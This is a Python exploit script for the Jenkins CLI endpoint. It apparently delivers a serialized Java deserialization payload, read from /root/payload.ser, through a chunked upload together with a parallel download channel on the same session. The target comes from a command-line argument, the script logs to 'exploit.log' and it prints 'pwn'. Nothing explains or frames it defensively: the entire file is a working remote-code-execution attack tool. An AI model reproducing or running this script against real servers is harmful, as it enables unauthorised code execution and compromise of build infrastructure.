import urllib
import requests
import uuid
import threading
import time
import logging
import argparse

logging.basicConfig(filename='exploit.log', level=logging.DEBUG)
logger = logging.getLogger()

proxies = {
    #  'http': 'http://127.0.0.1:8085',
    #  'https': 'http://127.0.0.1:8090',
}


PREAMBLE = b'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
PROTO = b'\x00\x00\x00\x00'

FILE_SER = open("/root/payload.ser", "rb").read()


def download(url, session):
    headers = {'Side': 'download'}
    # headers['Content-type'] = 'application/x-www-form-urlencoded'
    headers[
        'User-Agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'
    headers['X-CSRF-Token'] = 'DEADC0DEDEADBEEFCAFEBABEDABBAD00DBB0'
    headers['Session'] = session
    headers['Transfer-Encoding'] = 'chunked'
    r = requests.post(url, data=null_payload(), headers=headers, proxies=proxies, stream=True)
    print(r.content)


def upload(url, session, data):
    headers = {'Side': 'upload'}
    headers['Session'] = session
    # headers['Content-type'] = 'application/octet-stream'
    headers[
        'User-Agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'
    # headers['Content-Length'] = '335'
    headers['X-CSRF-Token'] = 'DEADC0DEDEADBEEFCAFEBABEDABBAD00DBB0'
    headers['Accept-Encoding'] = None
    r = requests.post(url, data=data, headers=headers, proxies=proxies)


def upload_chunked(url, session, data):
    logger.info('Uploading exploit {} {} {}'.format(url, session, data))
    headers = {'Side': 'upload'}
    headers['Session'] = session
    # headers['Content-type'] = 'application/octet-stream'
    headers[
        'User-Agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'
    # headers['Content-Length'] = '335'
    headers['X-CSRF-Token'] = 'DEADC0DEDEADBEEFCAFEBABEDABBAD00DBB0'
    headers['Accept-Encoding'] = None
    headers['Transfer-Encoding'] = 'chunked'
    headers['Cache-Control'] = 'no-cache'

    r = requests.post(url, headers=headers, data=create_payload_chunked(), proxies=proxies)
    logger.info('Got response {} {}'.format(r.status_code, r.text))


def null_payload():
    yield b" "


def create_payload():
    payload = PREAMBLE + PROTO + FILE_SER

    return payload


def create_payload_chunked():
    yield PREAMBLE
    yield PROTO
    yield FILE_SER


def main():

    parser = argparse.ArgumentParser(description="Get Params to send notification to CRWD topic")
    # Fully optional
    parser.add_argument('-t', '--target', help='Jenkins Server URL : ', required=True)
    logger.info("start")
    args = parser.parse_args()

    ############### SET GLOBALS
    TARGET = args.target
    logger.info('Waiting for target ip')

    URL = 'http://' + TARGET + ':80/cli'
    logger.info('Got target ip {} url is {}'.format(TARGET, URL))
    session = str(uuid.uuid4())

    t = threading.Thread(target=download, args=(URL, session))
    t.start()
    logger.info('Starting thread')
    time.sleep(1)
    print("pwn")
    # upload(URL, session, create_payload())

    upload_chunked(URL, session, "asdf")


if __name__ == "__main__":
    main()
